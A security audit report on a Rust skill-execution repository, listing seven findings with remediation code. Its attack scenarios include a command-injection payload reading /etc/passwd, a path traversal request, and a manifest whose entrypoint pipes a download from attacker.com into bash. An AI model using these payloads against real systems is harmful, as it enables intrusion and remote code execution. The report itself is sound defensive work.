# Security Audit Report - SAST Analysis

**Date:** 2024-01-30  
**Repository:** kubiyabot/skill  
**Auditor:** Security Engineering Team  
**Scope:** Static Application Security Testing (SAST) - Full Repository Scan

---

## Executive Summary

A comprehensive Static Application Security Testing (SAST) scan was performed on the `kubiyabot/skill` repository. **7 security vulnerabilities** were identified across **CRITICAL, HIGH, MEDIUM**, and **LOW** severity levels. This report provides detailed findings, risk assessments, and remediation recommendations.

### Vulnerability Distribution
- **CRITICAL:** 2 vulnerabilities
- **HIGH:** 2 vulnerabilities  
- **MEDIUM:** 2 vulnerabilities
- **LOW:** 1 vulnerability

---

## CRITICAL SEVERITY VULNERABILITIES

### 1. Command Injection in Installation Scripts ⚠️ CRITICAL

**Vulnerability Type:** OS Command Injection / Remote Code Execution  
**CWE ID:** CWE-78 (OS Command Injection)  
**CVSS Score:** 9.8 (Critical)

**Affected Files:**
- `install.sh` (lines 107, 112, 141)
- `scripts/test-web-ui.sh` (line 132)

**Description:**  
The installation scripts download and execute code from remote URLs using the insecure `curl | sh` pattern without:
- Integrity verification (checksums/signatures)
- TLS certificate pinning
- Content validation before execution

**Attack Scenario:**
```bash
# Attacker compromises DNS or performs MITM
curl -fsSL https://raw.githubusercontent.com/kubiyabot/skill/main/install.sh | sh
# Executes malicious code with user privileges
```

**Impact:**  
- **Arbitrary Code Execution** with user privileges
- **Complete system compromise** if run as root/sudo
- **Supply chain attack** vector
- **Data exfiltration** potential

**Proof of Concept:**
```bash
# Line 141 in install.sh - No integrity check
curl -fsSL "$DOWNLOAD_URL" -o "$TMP_DIR/skill.tar.gz"
# Directly executes downloaded binary without verification
```

**Remediation:**
1. **Implement SHA256 checksum verification:**
```bash
# Download checksum file
CHECKSUM_URL="https://github.com/${GITHUB_REPO}/releases/download/v${VERSION}/skill-${PLATFORM}.tar.gz.sha256"
curl -fsSL --tlsv1.2 --proto "=https" "$CHECKSUM_URL" -o "$TMP_DIR/skill.tar.gz.sha256"

# Verify download integrity
EXPECTED_CHECKSUM=$(cat "$TMP_DIR/skill.tar.gz.sha256" | awk '{print $1}')
ACTUAL_CHECKSUM=$(sha256sum "$TMP_DIR/skill.tar.gz" | awk '{print $1}')

if [ "$ACTUAL_CHECKSUM" != "$EXPECTED_CHECKSUM" ]; then
    error "Checksum verification failed! Download may be tampered with."
fi
```

2. **Add TLS 1.2+ enforcement:**
```bash
curl -fsSL --tlsv1.2 --proto "=https" "$DOWNLOAD_URL" -o "$TMP_DIR/skill.tar.gz"
```

3. **Validate HOME directory:**
```bash
if [ -z "$HOME" ] || [ ! -d "$HOME" ]; then
    error "HOME directory is not set or does not exist"
fi
```

---

### 2. Unsafe Command Construction & Execution ⚠️ CRITICAL

**Vulnerability Type:** Command Injection  
**CWE ID:** CWE-77 (Command Injection)  
**CVSS Score:** 9.1 (Critical)

**Affected Files:**
- `crates/skill-http/src/handlers.rs` (lines 327-342, 411-466)

**Description:**  
The `execute_native_skill()` function constructs OS commands from user-supplied input using string concatenation and `split_whitespace()`. No input validation or sanitization is performed before execution with `tokio::process::Command`.

**Vulnerable Code:**
```rust
// Line 327-342: Unsafe command construction
let command_str = build_native_command(skill_name, tool_name, &parsed_args)?;
let parts: Vec<&str> = command_str.split_whitespace().collect();
let program = parts[0];
let args = &parts[1..];

// Direct execution without validation
let output = Command::new(program)
    .args(args)
    .output()
    .await?;
```

**Attack Scenario:**
```json
POST /api/execute
{
  "skill": "kubernetes",
  "tool": "get; cat /etc/passwd #",
  "args": {"resource": "pods"}
}
```

**Impact:**
- **Arbitrary command execution** on the server
- **Privilege escalation** if service runs with elevated permissions
- **Data exfiltration** via command injection
- **Lateral movement** within infrastructure

**Remediation:**

1. **Use Command Allow-listing:**
```rust
// Define allowed commands per skill
const ALLOWED_COMMANDS: &[(&str, &str)] = &[
    ("kubernetes", "kubectl"),
    ("docker", "docker"),
    ("terraform", "terraform"),
    ("helm", "helm"),
    ("git", "git"),
];

fn validate_skill_command(skill_name: &str) -> Result<&'static str, SecurityError> {
    ALLOWED_COMMANDS
        .iter()
        .find(|(skill, _)| *skill == skill_name)
        .map(|(_, cmd)| *cmd)
        .ok_or(SecurityError::InvalidSkill)
}
```

2. **Validate and sanitize all inputs:**
```rust
fn sanitize_argument(arg: &str) -> Result<String, SecurityError> {
    // Reject dangerous characters
    if arg.contains(&['&', '|', ';', '\n', '`', '$', '(', ')'][..]) {
        return Err(SecurityError::InvalidArgument);
    }
    
    // Validate length
    if arg.len() > 1024 {
        return Err(SecurityError::ArgumentTooLong);
    }
    
    Ok(arg.to_string())
}
```

3. **Use proper argument passing (NOT shell expansion):**
```rust
// CORRECT: Arguments are passed directly, not through shell
Command::new(validated_program)
    .args(validated_args.iter().map(|s| s.as_str()))
    .output()
    .await
```

4. **Add rate limiting and audit logging:**
```rust
audit_log!(
    event = "command_execution",
    skill = skill_name,
    tool = tool_name,
    user = user_id,
    source_ip = request_ip
);
```

---

## HIGH SEVERITY VULNERABILITIES

### 3. Path Traversal Risk

**Vulnerability Type:** Path Traversal / Directory Traversal  
**CWE ID:** CWE-22 (Path Traversal)  
**CVSS Score:** 7.5 (High)

**Affected Files:**
- `crates/skill-http/src/handlers.rs` (line 90, 546-553)

**Vulnerable Code:**
```rust
// Line 90: Unsafe home directory handling
let home = dirs::home_dir().unwrap_or_default();
home.join(".skill-engine").join("registry").join(&name)

// Line 546: User-controlled path construction
let source_path = if skill_def.source.starts_with("./") {
    state.working_dir.join(&skill_def.source)
} else {
    let home = dirs::home_dir().unwrap_or_default(); // Returns "" on failure!
    home.join(".skill-engine").join("registry").join(&request.skill)
}
```

**Attack Scenario:**
```rust
// If home_dir() fails, unwrap_or_default() returns ""
// Combined with skill name "../../../etc/passwd"
// Results in accessing: "../../../etc/passwd" (current directory relative)

POST /api/skills/..%2F..%2F..%2Fetc%2Fpasswd/execute
```

**Impact:**
- **Unauthorized file access** outside intended directories
- **Information disclosure** of sensitive files
- **Potential code execution** if combined with file write capabilities

**Remediation:**
```rust
fn get_secure_skill_path(skill_name: &str, working_dir: &Path) -> Result<PathBuf> {
    // 1. Validate HOME directory
    let home = dirs::home_dir()
        .ok_or(SecurityError::HomeDirectoryNotFound)?;
    
    if !home.exists() || !home.is_dir() {
        return Err(SecurityError::InvalidHomeDirectory);
    }
    
    // 2. Sanitize skill name
    let sanitized_name = sanitize_path_component(skill_name)?;
    
    // 3. Construct path safely
    let skill_path = home
        .join(".skill-engine")
        .join("registry")
        .join(&sanitized_name);
    
    // 4. Validate result is within expected directory
    let canonical = skill_path.canonicalize()?;
    let expected_base = home.join(".skill-engine/registry").canonicalize()?;
    
    if !canonical.starts_with(&expected_base) {
        return Err(SecurityError::PathTraversalDetected);
    }
    
    Ok(canonical)
}

fn sanitize_path_component(component: &str) -> Result<String> {
    // Reject path traversal sequences
    if component.contains("..") || component.contains('/') || component.contains('\\') {
        return Err(SecurityError::InvalidPathComponent);
    }
    
    // Validate characters
    if !component.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_') {
        return Err(SecurityError::InvalidCharacters);
    }
    
    Ok(component.to_string())
}
```

---

### 4. Insecure Credential Storage Pattern

**Vulnerability Type:** Sensitive Data Exposure  
**CWE ID:** CWE-312 (Cleartext Storage of Sensitive Information)  
**CVSS Score:** 7.5 (High)

**Affected Files:**
- `.skill-engine.toml` (line 204)
- Configuration files with environment variable patterns

**Vulnerable Configuration:**
```toml
# Line 204: PostgreSQL password in environment
[skills.postgres.docker]
image = "postgres:16-alpine"
entrypoint = "psql"
environment = ["PGPASSWORD=${PGPASSWORD:-}"]  # Cleartext in process list!
```

**Issues:**
1. **Process List Exposure:** Environment variables visible in `ps aux` output
2. **Log Exposure:** Credentials may appear in application logs
3. **Core Dump Exposure:** Sensitive data in crash dumps
4. **Child Process Inheritance:** All child processes receive credentials

**Impact:**
- **Credential theft** by local users or malware
- **Lateral movement** using stolen credentials
- **Compliance violations** (PCI-DSS, GDPR, SOC 2)

**Remediation:**

1. **Use Docker Secrets:**
```toml
[skills.postgres.docker]
image = "postgres:16-alpine"
entrypoint = "psql"
secrets = ["postgres_password"]  # Mounted as /run/secrets/postgres_password

# In code: Read from /run/secrets/ instead of environment
```

2. **Use Credential Management Systems:**
```rust
// Integration with HashiCorp Vault, AWS Secrets Manager, etc.
let password = credential_manager
    .get_secret("postgres/production/password")
    .await?;

// Pass via stdin instead of environment
let mut child = Command::new("psql")
    .stdin(Stdio::piped())
    .spawn()?;

child.stdin.as_mut().unwrap()
    .write_all(password.as_bytes())?;
```

3. **Use Connection Files with Restricted Permissions:**
```bash
# .pgpass file with 0600 permissions
chmod 600 ~/.pgpass
echo "localhost:5432:dbname:username:password" > ~/.pgpass
```

---

## MEDIUM SEVERITY VULNERABILITIES

### 5. Insufficient Input Validation in Manifest Parsing

**Vulnerability Type:** Injection / Resource Exhaustion  
**CWE ID:** CWE-20 (Improper Input Validation)  
**CVSS Score:** 6.5 (Medium)

**Affected Files:**
- `crates/skill-http/src/handlers.rs` (lines 2244-2555)

**Vulnerable Code:**
```rust
// No size limits or content validation
pub async fn import_manifest(
    State(state): State<Arc<AppState>>,
    Json(request): Json<ImportManifestRequest>,
) -> Result<Json<ImportManifestResponse>> {
    // Accepts arbitrary TOML without limits
    let parsed: Result<toml::Value, _> = toml::from_str(&request.content);
    
    // Accepts arbitrary Docker configurations
    let docker_config = skill_table.get("docker")
        .and_then(|v| v.as_table())
        .map(|docker| DockerConfig {
            image: docker.get("image").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            // No validation of image name, volumes, etc.
        });
}
```

**Attack Scenarios:**

1. **Resource Exhaustion:**
```toml
# 100MB TOML file with deeply nested structures
[skills]
[skills.a1]
[skills.a1.instances.b1]
[skills.a1.instances.b1.config.c1]
# ... thousands of nested levels
```

2. **Malicious Docker Configuration:**
```toml
[skills.malicious.docker]
image = "malicious/backdoor:latest"
volumes = ["/:/hostroot"]  # Full filesystem access!
entrypoint = "bash -c 'curl attacker.com | bash'"
```

**Remediation:**

```rust
const MAX_MANIFEST_SIZE: usize = 1_048_576; // 1MB
const MAX_SKILLS: usize = 100;
const MAX_INSTANCES: usize = 50;

fn validate_manifest(content: &str) -> Result<()> {
    // Size check
    if content.len() > MAX_MANIFEST_SIZE {
        return Err(SecurityError::ManifestTooLarge);
    }
    
    // Parse TOML
    let value: toml::Value = toml::from_str(content)?;
    
    // Count skills
    if let Some(skills) = value.get("skills").and_then(|v| v.as_table()) {
        if skills.len() > MAX_SKILLS {
            return Err(SecurityError::TooManySkills);
        }
        
        // Validate each skill
        for (name, skill) in skills {
            validate_skill_config(name, skill)?;
        }
    }
    
    Ok(())
}

fn validate_docker_config(docker: &DockerConfig) -> Result<()> {
    // Validate image name (registry/repo:tag format)
    if !is_valid_docker_image(&docker.image) {
        return Err(SecurityError::InvalidDockerImage);
    }
    
    // Restrict dangerous volume mounts
    for volume in &docker.volumes {
        if volume.starts_with("/etc") || volume.starts_with("/proc") || volume == "/" {
            return Err(SecurityError::DangerousVolumeMount);
        }
    }
    
    // Restrict privileged modes
    if docker.privileged == Some(true) {
        return Err(SecurityError::PrivilegedContainerNotAllowed);
    }
    
    Ok(())
}
```

---

### 6. Use of `.unwrap()` Without Error Handling

**Vulnerability Type:** Denial of Service  
**CWE ID:** CWE-703 (Improper Check or Handling of Exceptional Conditions)  
**CVSS Score:** 5.3 (Medium)

**Affected Files:**
- `crates/skill-runtime/src/engine.rs` (line 68)
- `crates/skill-http/src/handlers.rs` (line 90)
- `crates/skill-runtime/src/credentials.rs` (line 155)

**Vulnerable Code:**
```rust
// Line 68: Panics if engine creation fails
impl Default for SkillEngine {
    fn default() -> Self {
        Self::new().expect("Failed to create default SkillEngine")
    }
}

// Line 90: Returns "" if home_dir is None
let home = dirs::home_dir().unwrap_or_default();

// Line 155: Panics on parse failure
let (skill, instance, key) = parse_keyring_reference(reference).unwrap();
```

**Impact:**
- **Service crashes** leading to downtime
- **Denial of Service** attacks by triggering panic conditions
- **Loss of availability** for legitimate users

**Remediation:**

```rust
// Replace unwrap() with proper error handling
impl Default for SkillEngine {
    fn default() -> Self {
        Self::new().unwrap_or_else(|e| {
            tracing::error!("Failed to create default SkillEngine: {}", e);
            // Return a minimal working instance or handle gracefully
            panic!("Critical: SkillEngine initialization failed: {}", e)
        })
    }
}

// Return Result instead of panicking
pub fn get_skill_home_dir() -> Result<PathBuf, SecurityError> {
    dirs::home_dir()
        .ok_or(SecurityError::HomeDirectoryNotFound)
        .and_then(|home| {
            if home.as_os_str().is_empty() {
                Err(SecurityError::EmptyHomeDirectory)
            } else {
                Ok(home)
            }
        })
}

// Handle parsing errors gracefully
match parse_keyring_reference(reference) {
    Ok((skill, instance, key)) => {
        // Process successfully
    }
    Err(e) => {
        tracing::warn!("Failed to parse keyring reference: {}", e);
        return Err(CredentialError::InvalidReference);
    }
}
```

---

## LOW SEVERITY VULNERABILITIES

### 7. Missing TLS Certificate Validation

**Vulnerability Type:** Man-in-the-Middle  
**CWE ID:** CWE-295 (Improper Certificate Validation)  
**CVSS Score:** 3.7 (Low)

**Affected Files:**
- `install.sh` (lines 107, 112, 141)

**Vulnerable Code:**
```bash
# No explicit cert validation flags
curl -fsSL "https://api.github.com/repos/${GITHUB_REPO}/releases/latest"
curl -fsSL "$DOWNLOAD_URL" -o "$TMP_DIR/skill.tar.gz"
```

**Impact:**
- **Man-in-the-Middle attacks** possible on networks with SSL interception
- **Compromised downloads** if attacker controls network

**Remediation:**
```bash
# Enforce TLS 1.2+, enable certificate validation
curl -fsSL --tlsv1.2 --proto "=https" --cacert /etc/ssl/certs/ca-certificates.crt \
    "https://api.github.com/repos/${GITHUB_REPO}/releases/latest"

# Or ensure system CA bundle is current
curl --version  # Check OpenSSL version
```

---

## Summary of Recommendations

### Immediate Actions (Critical)
1. ✅ **Deploy checksum verification** in `install.sh`
2. ✅ **Implement command allow-listing** in `execute_native_skill()`
3. ✅ **Add input sanitization** for all user-controlled data

### Short Term (High/Medium)
4. ✅ **Validate and sanitize path construction**
5. ✅ **Migrate to secure credential management**
6. ✅ **Add manifest size limits and validation**
7. ✅ **Replace `.unwrap()` with error handling**

### Long Term (Low/Hardening)
8. ✅ **Implement comprehensive audit logging**
9. ✅ **Add rate limiting on API endpoints**
10. ✅ **Set up automated security scanning in CI/CD**

---

## Security Testing Recommendations

1. **Dynamic Analysis:**
   - Perform penetration testing on native skill execution
   - Test command injection vectors
   - Validate path traversal protections

2. **Automated Scanning:**
   - Integrate `cargo audit` for dependency vulnerabilities
   - Add `clippy` security lints in CI/CD
   - Deploy SAST tools (Semgrep, CodeQL) in GitHub Actions

3. **Code Review:**
   - Require security review for all `Command::new()` usage
   - Review all user input handling paths
   - Validate all file system operations

---

## Compliance Considerations

- **CIS Benchmarks:** Secure configuration baselines
- **OWASP Top 10:** A03:Injection, A05:Security Misconfiguration
- **NIST:** Secure software development practices
- **PCI-DSS:** Requirement 6 (Secure Development)

---

**Report Generated:** 2024-01-30  
**Next Review:** Recommended within 90 days  
**Contact:** Security Team
